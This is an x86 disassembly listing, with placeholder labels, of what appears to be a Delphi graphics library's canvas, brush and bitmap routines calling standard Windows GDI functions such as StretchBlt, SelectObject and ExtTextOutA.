sub_41c870
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413d50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c900
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bd68
xor eax eax
push ebp
push sub_41c8e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8ea
mov eax [ ebp - 0x8 ]
call sub_41bd78
retn
sub_41c918
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41c934
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c979
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b6e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c980
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c984
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41c934
add esp 0x10
pop edi
pop esi
retn
sub_41c9b0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c918
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41c934
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41c9e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b53c
xor edx edx
push ebp
push sub_41cab1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b548
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bd24
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41cacc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c918
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41c934
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41cb00
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d680
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c53c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d6a0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c808
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d6c0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413a90
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41cbc4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413b2c
xor edx edx
mov eax esi
call sub_41d4b8
mov eax [ esi + 0xc ]
call sub_403258
mov eax [ esi + 0x10 ]
call sub_403258
mov eax [ esi + 0x14 ]
call sub_403258
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413d24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41cc20
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_41cec6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d50c
mov eax [ ebp - 0x8 ]
call sub_4200f8
call sub_41d0c4
xor eax eax
push ebp
push sub_41cea1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov edi [ ebx + 0x8 ]
sub edi [ ebx ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_4201e4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_420358
mov eax [ ebp - 0x24 ]
call sub_4200f8
mov dl [ r-xdata ]
call sub_41d50c
mov eax [ ebp - 0x24 ]
call sub_4200f8
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x28 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
jmp r-xdata
push 0xcc0020
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4200f8
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov [ ebp - 0x18 ] eax
push 0xe20746
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4200f8
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41d9c8
jmp r-xdata
xor eax eax
push ebp
push sub_41ce7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4200f8
mov dl [ r-xdata ]
call sub_41d50c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cac4
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_403258
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce86
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
retn
sub_41cee0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d50c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41cf68
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax [ ebx + 0x14 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412378
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax [ ebx + 0x14 ]
call sub_41c9e4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d050
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax [ ebx + 0x14 ]
call sub_41c9e4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d08c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d0ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d118
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d160
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d19c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d438
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d1c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax ebx
call sub_41d19c
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_404250
push eax
mov eax esi
call sub_404450
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41d298
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d0ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41d298
inc eax
add edi eax
sub_41d254
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404250
push eax
mov eax edi
call sub_404450
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d298
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d254
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d2b4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d254
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d2d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d320
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d327
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d0c4
sub_41d380
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d3a4
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d0ec
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d3c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d3f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d50c
mov eax [ ebp + 0x8 ]
call sub_41bd24
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d458
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d4b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d458
mov edx esp
mov eax ebx
call sub_41d380
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d3a4
sub_41d50c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d5a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
test bl 0x8
je r-xdata
mov eax esi
call sub_41d5d4
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d604
sub_41d5a8
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c1f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d5d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41c6f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d604
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41c9e4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41c9e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41cac4
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41c9a8
call sub_41bd24
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41d728
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41d772
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d779
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_41d77c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41d818
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d728
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404200
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d81f
lea eax [ ebp - 0x104 ]
call sub_403f90
retn
sub_41d834
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41d982
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41d8f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41d77c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41d77c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d989
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41d994
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41d9c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41dc48
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d824
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc4f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
